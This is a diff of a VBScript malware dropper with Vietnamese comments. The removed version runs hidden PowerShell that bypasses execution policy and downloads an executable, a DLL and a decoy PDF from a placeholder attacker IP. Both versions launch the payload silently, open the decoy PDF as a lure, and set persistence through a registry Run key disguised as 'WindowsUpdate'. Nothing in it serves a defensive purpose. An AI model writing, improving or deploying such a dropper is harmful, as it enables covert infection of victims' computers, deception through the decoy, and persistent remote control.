@@ -1,13 +1,13 @@
 Set WshShell = CreateObject("WScript.Shell")
-' Chạy PowerShell ẩn hoàn toàn (0)
-' Lệnh này tải 3 file, thực thi exe, mở pdf mồi và tạo tự khởi động (Persistent)
-strPS = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-"""$t=$env:TEMP; " & _
-"iwr 'http://IP_CUA_BAN/app.exe' -OutF '$t\app.exe'; " & _
-"iwr 'http://IP_CUA_BAN/vinh.dll' -OutF '$t\vinh.dll'; " & _
-"iwr 'http://IP_CUA_BAN/decoy.pdf' -OutF '$t\decoy.pdf'; " & _
-"Start-Process '$t\app.exe'; " & _
-"Start-Process '$t\decoy.pdf'; " & _
-"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value '$t\app.exe' -PropertyType 'String' -Force"""
+strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 
-WshShell.Run strPS, 0, False
+' 1. Mở file PDF mồi nhử ngay lập tức
+WshShell.Run "cmd /c start """" """ & strTemp & "\decoy.pdf""", 0, False
+
+' 2. Chạy app.exe ngầm
+WshShell.Run """" & strTemp & "\app.exe""", 0, False
+
+' 3. Thiết lập Persistence (Tự khởi động cùng Windows)
+' Nó sẽ ghi vào Registry để mỗi lần mở máy app.exe sẽ tự chạy
+strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
+WshShell.RegWrite strRegPath, strTemp & "\app.exe", "REG_SZ"
